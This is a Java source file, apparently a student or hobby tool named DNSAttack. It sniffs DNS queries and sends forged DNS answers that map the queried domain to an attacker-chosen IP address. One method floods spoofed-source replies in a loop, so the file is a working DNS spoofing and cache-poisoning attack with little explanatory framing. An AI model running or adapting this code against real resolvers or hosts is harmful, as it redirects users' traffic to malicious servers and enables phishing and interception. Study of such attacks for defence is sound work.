// Based on https://routley.io/tech/2017/12/28/hand-writing-dns-messages.html

import jpcap.packet.Packet;

import java.io.IOException;
import java.net.DatagramPacket;
import java.util.ArrayList;

public class DNSAttack {
    private static final int dnsPort = 53;
    private static final int numPorts = 65536;
    private static String answerFlags = "8180";
    private static String answerNumQuestions = "0001";
    private static String answerNumAnswers = "0001";
    private static String answerNumAuthorityRecords = "0000";
    private static String answerNumAdditionalRecords = "0000";
    private static byte[] headerWithoutId = Utils.hexStringToByteArray(answerFlags + answerNumQuestions + answerNumAnswers + answerNumAuthorityRecords + answerNumAdditionalRecords);
    private static String answer_name = "c00c";
    private static String answer_type = "0001";
    private static String answer_class = "0001";
    private static byte[] answerSectionBegin = Utils.hexStringToByteArray(answer_name + answer_type + answer_class);
    private static byte[] answerSectionTTL = Utils.hexStringToByteArray("0000000a");
    private static byte[] answerSectionIpLength = Utils.hexStringToByteArray("0004");

    public void showDNSQuery(byte[] dnsQuery) {
        System.out.println("ID: " + Utils.byteArrayToHexString(Utils.getPartOfByteArray(dnsQuery, 0, 1)));
        System.out.println("Flags: " + Utils.byteArrayToHexString(Utils.getPartOfByteArray(dnsQuery, 2, 3)));
        System.out.println("Num. Questions: " + Utils.byteArrayToHexString(Utils.getPartOfByteArray(dnsQuery, 4, 5)));
        System.out.println("Num. Answers RRs: " + Utils.byteArrayToHexString(Utils.getPartOfByteArray(dnsQuery, 6, 7)));
        System.out.println("Num. Authority RRs: " + Utils.byteArrayToHexString(Utils.getPartOfByteArray(dnsQuery, 8, 9)));
        System.out.println("Num. Additional RRs: " + Utils.byteArrayToHexString(Utils.getPartOfByteArray(dnsQuery, 10, 11)));
        System.out.println("Queried URL: " + parseDNSQueryURL(dnsQuery));
    }

    public String parseDNSQueryURL(byte[] dnsQuery) {
        ArrayList<String> urlParts = new ArrayList<>();
        int pos = 12;
        int length = (int) dnsQuery[pos];
        while (length != 0) {
            pos++;
            String part = new String(dnsQuery, pos, length);
            urlParts.add(part);
            pos += length;
            length = (int) dnsQuery[pos];
        }
        StringBuilder url = new StringBuilder();
        url.append(urlParts.get(0));
        for (int i = 1; i < urlParts.size(); i++)
            url.append(".").append(urlParts.get(i));
        return url.toString();
    }

    public byte[] generateDNSAnswer(byte[] dnsQuery, String erroneousIP) {
        int urlLength = parseDNSQueryURL(dnsQuery).length() + 1;
        byte[] answer = new byte[urlLength + 33];
        System.arraycopy(dnsQuery, 0, answer, 0, 2);  // ID
        System.arraycopy(headerWithoutId, 0, answer, 2, 10 /* headerWithoutId.length() */);
        System.arraycopy(dnsQuery, 12, answer, 12, urlLength + 5); // Query [URL + URL terminator (0x00) + QType (16 bits) + QClass (16 bits)]
        System.arraycopy(answerSectionBegin, 0, answer, urlLength + 17, 6);
        System.arraycopy(answerSectionTTL, 0, answer, urlLength + 23, 4);
        System.arraycopy(answerSectionIpLength, 0, answer, urlLength + 27, 2);
        String[] ipParts = erroneousIP.split("\\.");
        for (int i = 0; i < ipParts.length; i++)
            answer[urlLength + 29 + i] = (byte) (Integer.parseInt(ipParts[i]));
        return answer;
    }

    public void sendFakeAnswerToSniffedQuery(int timeoutMillis, String erroneousIP) {
        try {
            Sniffer sniffer = new Sniffer(true, Sniffer.putPortInFilter(Sniffer.Filter_IP_AND_UDP_AND_PORT_X_ONLY, dnsPort), true);
            ArrayList<Packet> packets = sniffer.sniff(1);
            System.out.println(packets.get(0));
            UDPPacketData udpPacketData = new UDPPacketData(packets.get(0));
            //UDPSocket udpSocket = new UDPSocket(udpPacketData.getReceiverPort());
            byte[] answer = generateDNSAnswer(packets.get(0).data, erroneousIP);
            long loopStopMillis = System.currentTimeMillis() + timeoutMillis;
            while (System.currentTimeMillis() < loopStopMillis)
                //udpSocket.sendUDPPacket(udpPacketData.getSenderIP(), udpPacketData.getSenderPort(), answer);
                UDPSocket.SendUDPPacketNative(udpPacketData.getReceiverIP(), udpPacketData.getReceiverPort(), udpPacketData.getSenderIP(), udpPacketData.getSenderPort(), answer);
            //udpSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /* In order for this function to work, the attacked machine
        needs to query the machine where this function is running. */
    public void sendFakeAnswerToHost(String fakeSourceIP, int timeoutMillis, String erroneousIP) {
        int numCores = Runtime.getRuntime().availableProcessors();
        try {
            UDPSocket udpSocket = new UDPSocket(dnsPort);
            DatagramPacket dnsQueryPacket = udpSocket.receiveUDPPacket();
            byte[] dnsQuery = dnsQueryPacket.getData();
            showDNSQuery(dnsQuery);
            byte[] answer = generateDNSAnswer(dnsQuery, erroneousIP);

            long loopStopMillis = System.currentTimeMillis() + timeoutMillis;
            while (System.currentTimeMillis() < loopStopMillis) {
                int portsByCore = numPorts / numCores;
                for (int assignedPorts = 0; assignedPorts < numPorts; assignedPorts += portsByCore) {
                    final int firstPort = assignedPorts;
                    final int lastPort = Math.min(assignedPorts + portsByCore, numPorts) - 1;
                    //new Thread(() -> {
                    for (int port = firstPort; port <= lastPort; port++) {
                        UDPSocket.SendUDPPacketNative(fakeSourceIP, dnsPort, dnsQueryPacket.getAddress().getHostAddress(), dnsQueryPacket.getPort(), answer);
                        /*try {
                            udpSocket.sendUDPPacket(dnsQueryPacket.getAddress().getHostAddress(), dnsQueryPacket.getPort(), answer);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }*/
                    }
                    //}).start();
                }
            }
            udpSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
